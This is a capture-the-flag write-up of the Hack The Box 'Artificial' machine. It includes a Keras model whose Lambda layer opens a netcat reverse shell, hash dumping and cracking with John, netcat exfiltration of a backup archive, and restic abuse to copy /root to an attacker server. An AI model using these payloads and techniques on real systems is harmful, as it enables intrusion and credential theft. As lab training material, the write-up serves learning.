# 🚪 Hack The Box – Artificial (Easy)
Machine Type: Linux | Solved by: Akshat Nigam | Category:Web Exploitation, Docker Misconfiguration, Privilege Escalation | Difficulty: Easy | Attack Surface:HTTP (port 80), TensorFlow via file upload
---
## Initial Enumeration

### Nmap Scan

```bash
nmap -sV -sC 10.10.11.74 -v
```

**Open Ports:**

* 22/tcp: OpenSSH 8.2p1
* 80/tcp: HTTP (nginx 1.18.0)
---
## Web Exploitation - TensorFlow RCE

1. Register a user and access the upload page.
2. Gather `requirements.txt` and `Dockerfile` for environment context:

### Dockerfile

```dockerfile
FROM python:3.8-slim
WORKDIR /code
RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/.../tensorflow_cpu-2.13.1...whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1...whl
ENTRYPOINT ["/bin/bash"]
```
Build the Docker image using 

```bash
docker build -t <image name> .
```
Start the container 

```bash
docker run -it -v $(pwd):/app <image name> 
```
---
### Exploit Code

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```
Open a nc connection in your terminal as a listenner

```bash
nc -nlvp 6666
```
## 3. Upload model and trigger execution by clicking **"View Predictions"**.

 

---
## Getting User

### SQL Enumeration

```bash
sqlite3 users.db
sqlite> SELECT * FROM user;
```

Extracted user hashes. Example:

```plaintext
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
```
---
### Cracking Hash with John

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

Cracked Password: `mattp005numbertwo`
---
### SSH Access

```bash
ssh gael@10.10.11.74
```
---
## Privilege Escalation - Root

### Backup Discovery

```bash
cd /var/backups
ls -la
```

Found: `backrest_backup.tar.gz`

Extracted and found:
---
## Netcat Transfer 

```bash
nc -nv <your ip> <port> < backrest_backup.tar.gz
```
On your Attacking machine open the listening 

```bash
nc -nlvp <port> > backrest_backup.tar.gz
```
Unzip it and read 

```bash
cat .config/backrest/config.json
```

```json
"passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
```
---
### Decode and Crack Bcrypt

```bash
echo '<base64>' | base64 -d > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

Cracked Password: `!@#$%^`

## Now check the intranet connections 

```bash
ss -tulnp
```
Here you will find a service running inside the network on port 9898

### Internal Port Forwarding

Access the internal (intranet-only) web apps or services behind the firewall 
-L set up local port forwarding on 9898 in the attacker's machine

```bash
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```
---
## Using Restic (GTFOBins)
Go to the http://localhost:9898 enter the username and password you gained above. 
```bash
Username: backrest_root
Password: !@#$%^
```
---
### Start Local Restic Server

Create your own Repo name it according to your use. 

```bash
Repository Url: /opt
Password: <Depends on you>
```
On your system, install Rest-server, using go

```bash
./rest-server --path /tmp/restic-data --listen :12345 --no-auth
```

### On Target - Backup `/root`

Now after creating the repo, in the Run command execute:

```bash
restic -r rest:http://<your-ip>:12345/myrepo init
restic -r rest:http://<your-ip>:12345/myrepo backup /root
```
---
### On Attacker - Restore Snapshot

```bash
restic -r /tmp/restic-data/myrepo snapshots
restic -r /tmp/restic-data/myrepo restore <snapshot-id> --target ./restore
```

Root flag found:

```bash
cat restore/root/root.txt
```
---
### SSH as Root (Optional)

```bash
ssh -i ./id_rsa root@Artificial.htb
```

---

## Summary

* **User:** Achieved via TensorFlow model RCE and hash cracking.
* **Root:** Extracted from backup archive, cracked bcrypt password, used port forwarding and restic GTFOBin to restore `/root`.

> Rooted 🎉
